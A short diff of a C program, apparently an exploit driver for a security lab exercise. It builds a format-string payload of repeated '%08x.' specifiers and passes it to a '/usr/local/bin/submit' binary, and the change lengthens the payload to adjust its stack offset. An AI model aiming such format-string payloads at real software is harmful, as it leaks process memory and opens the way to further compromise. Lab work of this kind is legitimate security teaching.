@@ -20,7 +20,7 @@ int main(){
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
-			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";
+			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";
 	char* cmd = (char*)malloc(1000);
 	p_cmd_len = strlen(p_cmd);
 	snprintf(cmd, 1000, "/usr/local/bin/submit %s", p_cmd);
